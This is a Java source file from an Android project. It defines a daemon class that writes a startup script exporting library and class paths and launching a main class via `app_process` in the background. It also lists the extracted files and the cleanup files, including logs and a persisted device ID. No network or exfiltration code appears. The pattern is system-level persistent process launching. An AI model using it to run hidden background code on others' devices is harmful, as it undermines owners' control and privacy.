package com.fx.maind.ref;

import java.io.File;
import java.util.ArrayList;

import com.fx.daemon.Daemon;
import com.fx.daemon.DaemonHelper;
import com.vvt.logger.FxLog;
import com.vvt.shell.Shell;

public class MainDaemon extends Daemon {
	
	private static final String TAG = "MainDaemon";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static ArrayList<File> sExtractingFileList;
	private static ArrayList<File> sRemovingFileList;
	
	@Override
	public String getTag() {
		return TAG;
	}

	@Override
	public String getProcessName() {
		return MainDaemonResource.PROCESS_NAME;
	}

	@Override
	public String getStartupScriptPath() {
		return MainDaemonResource.STARTUP_SCRIPT_PATH;
	}

	@Override
	protected void createStartupScript() throws Exception {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:<native lib path>
		StringBuilder builder = new StringBuilder(DaemonHelper.SYSTEM_LIB_PATH);
		if (! DaemonHelper.SYSTEM_LIB_PATH.equals(MainDaemonResource.NATIVE_LIBS_PATH)) {
			builder.append(":").append(MainDaemonResource.NATIVE_LIBS_PATH);
		}
		script.append(String.format(FORMAT_LIBRARY, builder.toString()));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				MainDaemonResource.EXTRACTING_PATH, 
				MainDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, MainDaemonResource.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		createStartupScriptFile(MainDaemonResource.STARTUP_SCRIPT_PATH, result);
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
	}

	@Override
	protected ArrayList<File> getExtractingFileList() {
		if (sExtractingFileList == null) {
			
			sExtractingFileList = new ArrayList<File>();
			
			sExtractingFileList.add(new File(
					MainDaemonResource.EXTRACTING_PATH, 
					MainDaemonResource.DEX_ZIP_FILENAME));
			
			sExtractingFileList.add(new File(
					MainDaemonResource.EXTRACTING_PATH, 
					MainDaemonResource.SECURITY_CONFIG_FILE));
			
			sExtractingFileList.add(new File(
					MainDaemonResource.NATIVE_LIBS_PATH, 
					Shell.LIB_EXEC_FILE));
		}
		
		return sExtractingFileList;
	}

	@Override
	protected ArrayList<File> getRemovingFileList() {
		if (sRemovingFileList == null) {
			
			if (sExtractingFileList == null) {
				getExtractingFileList();
			}
			
			sRemovingFileList = new ArrayList<File>();
			sRemovingFileList.addAll(sExtractingFileList);
			sRemovingFileList.add(new File(MainDaemonResource.STARTUP_SCRIPT_PATH));
			sRemovingFileList.add(new File(
					MainDaemonResource.LOG_FOLDER, 
					MainDaemonResource.LOG_FILENAME));
			sRemovingFileList.add(new File(MainDaemonResource.PERSISTED_DEVICE_ID_PATH));
			sRemovingFileList.add(new File(
					MainDaemonResource.EXTRACTING_PATH, "*.db"));
			sRemovingFileList.add(new File(
					MainDaemonResource.EXTRACTING_PATH, "*.ref"));
		}
		
		return sRemovingFileList;
	}
	
}
